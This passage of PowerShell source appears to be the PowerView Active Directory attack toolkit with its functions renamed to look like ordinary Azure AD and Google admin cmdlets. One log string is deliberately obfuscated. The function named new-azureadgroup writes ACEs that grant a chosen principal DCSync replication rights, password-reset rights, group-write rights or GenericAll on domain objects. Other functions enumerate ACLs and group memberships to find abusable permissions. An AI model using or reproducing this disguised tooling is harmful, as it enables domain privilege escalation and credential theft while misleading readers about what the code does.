        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $searcher = set-azureaddevice @SearcherArguments
        $domainguidmaparguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainGUIDMapArguments['Server'] = $Server }
        if ($PSBoundParameters['ResultPageSize']) { $DomainGUIDMapArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }
        
        if ($PSBoundParameters['ResolveGUIDs']) {
            $guids = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }
    PROCESS {
        if ($Searcher) {
            $identityfilter = ''
            $filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $identityinstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-.*') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        
                        
                        $identitydomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $searcher = set-azureaddevice @SearcherArguments
                        if (-not $Searcher) {
                            Write-Warning "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $guidbytestring = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            if ($Filter) {
                $Searcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)"
            $results = $Searcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $objectsid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $objectsid = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $guidfilter = Switch ($RightsFilter) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $GuidFilter) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                                $continue = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                            $continue = $True
                        }
                        if ($Continue) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                
                                $aclproperties = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $AclProperties[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.Name] = $_.Value
                                    }
                                }
                                $outobject = New-Object -TypeName PSObject -Property $AclProperties
                                $OutObject.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $OutObject
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[Get-DomainObjectAcl] Error: $_"
                }
            }
        }
    }
}
function new-azureadgroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $targetidentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $targetdomain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $targetldapfilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $targetsearchbase,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $principalidentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $principaldomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [Switch]
        $tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $rights = 'All',
        [Guid]
        $rightsguid
    )
    BEGIN {
        $targetsearcherarguments = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }
        $principalsearcherarguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
        $principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }
    PROCESS {
        $TargetSearcherArguments['Identity'] = $TargetIdentity
        $targets = Get-DomainObject @TargetSearcherArguments
        ForEach ($TargetObject in $Targets) {
            $inheritancetype = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $controltype = [System.Security.AccessControl.AccessControlType] 'Allow'
            $aces = @()
            if ($RightsGUID) {
                $guids = @($RightsGUID)
            }
            else {
                $guids = Switch ($Rights) {
                    
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    
                    
                    
                    
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }
            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)"
                try {
                    $identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $newguid = New-Object Guid $GUID
                            $adrights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        
                        $adrights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }
                    
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $targetentry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function get-azureadcontact {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $domain,
        [Switch]
        $resolveguids,
        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $rightsfilter,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $ldapfilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $searchbase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [Switch]
        $tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $aclarguments = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $ACLArguments['ResolveGUIDs'] = $ResolveGUIDs }
        if ($PSBoundParameters['RightsFilter']) { $ACLArguments['RightsFilter'] = $RightsFilter }
        if ($PSBoundParameters['LDAPFilter']) { $ACLArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $ACLArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }
        $objectsearcherarguments = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $ObjectSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ObjectSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ObjectSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ObjectSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ObjectSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ObjectSearcherArguments['Credential'] = $Credential }
        $adnamearguments = @{}
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
        
        $resolvedsids = @{}
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $ACLArguments['Domain'] = $Domain
            $ADNameArguments['Domain'] = $Domain
        }
        set-azureadmsauthorizationpolicy @ACLArguments | ForEach-Object {
            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $identityreferenceclass = $ResolvedSIDs[$_.SecurityIdentifier.Value]
                        $interestingacl = New-Object PSObject
                        $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
                        $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                        $InterestingACL
                    }
                    else {
                        $identityreferencedn = set-azureadapplicationproxyapplicationconnectorgroup -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
                        
                        if ($IdentityReferenceDN) {
                            $identityreferencedomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            
                            $ObjectSearcherArguments['Domain'] = $IdentityReferenceDomain
                            $ObjectSearcherArguments['Identity'] = $IdentityReferenceDN
                            
                            $object = Get-DomainObject @ObjectSearcherArguments
                            if ($Object) {
                                $identityreferencename = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $identityreferenceclass = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $identityreferenceclass = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $identityreferenceclass = 'user'
                                }
                                else {
                                    $identityreferenceclass = $Null
                                }
                                
                                $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass
                                $interestingacl = New-Object PSObject
                                $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
                                $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                                $InterestingACL
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}
function get-crosscloudverificationcode {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty
    )
    $searcherarguments = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    $dcsid = get-gscalendarresourcelist @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid
    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[Get-DomainSID] Error extracting domain SID for '$Domain'"
    }
}
function set-azureadmsgroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $identity,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $memberidentity,
        [Switch]
        $admincount,
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $groupscope,
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $groupproperty,
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $ldapfilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $searchbase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $securitymasks,
        [Switch]
        $tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $findone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $raw
    )
    BEGIN {
        $searcherarguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $groupsearcher = set-azureaddevice @SearcherArguments
    }
    PROCESS {
        if ($GroupSearcher) {
            if ($PSBoundParameters['MemberIdentity']) {
                if ($SearcherArguments['Properties']) {
                    $oldproperties = $SearcherArguments['Properties']
                }
                $SearcherArguments['Identity'] = $MemberIdentity
                $SearcherArguments['Raw'] = $True
                Get-DomainObject @SearcherArguments | ForEach-Object {
                    
                    $objectdirectoryentry = $_.GetDirectoryEntry()
                    
                    $ObjectDirectoryEntry.RefreshCache('tokenGroups')
                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
                        
                        $groupsid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        
                        if ($GroupSid -notmatch '^S-1-5-32-.*') {
                            $SearcherArguments['Identity'] = $GroupSid
                            $SearcherArguments['Raw'] = $False
                            if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                            $group = Get-DomainObject @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $identityfilter = ''
                $filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $identityinstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            
                            
                            $identitydomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $groupsearcher = set-azureaddevice @SearcherArguments
                            if (-not $GroupSearcher) {
                                Write-Warning "[Get-DomainGroup] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $guidbytestring = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $convertedidentityinstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | set-azureadapplicationproxyapplicationconnectorgroup -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $groupdomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $groupname = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$GroupDomain' from '$IdentityInstance'"
                            $groupsearcher = set-azureaddevice @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }
                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[Get-DomainGroup] Searching for adminCount=1'
                    $Filter += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $groupscopevalue = $PSBoundParameters['GroupScope']
                    $filter = Switch ($GroupScopeValue) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group scope '$GroupScopeValue'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $grouppropertyvalue = $PSBoundParameters['GroupProperty']
                    $filter = Switch ($GroupPropertyValue) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group property '$GroupPropertyValue'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroup] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }
                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroup] filter string: $($GroupSearcher.filter)"
                if ($PSBoundParameters['FindOne']) { $results = $GroupSearcher.FindOne() }
                else { $results = $GroupSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        
                        $group = $_
                    }
                    else {
                        $group = get-azureadcurrentsessioninfo -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[ et-Do#ain roup] Error disposing of the Results object".replace('#', 'm').replace(' ', 'G')
                    }
                }
                $GroupSearcher.dispose()
            }
        }
    }
}
function get-gsgmailfilterlist {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $domain,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $recurse,
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $recurseusingmatchingrule,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $ldapfilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $searchbase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $searchscope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $resultpagesize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $servertimelimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $securitymasks,
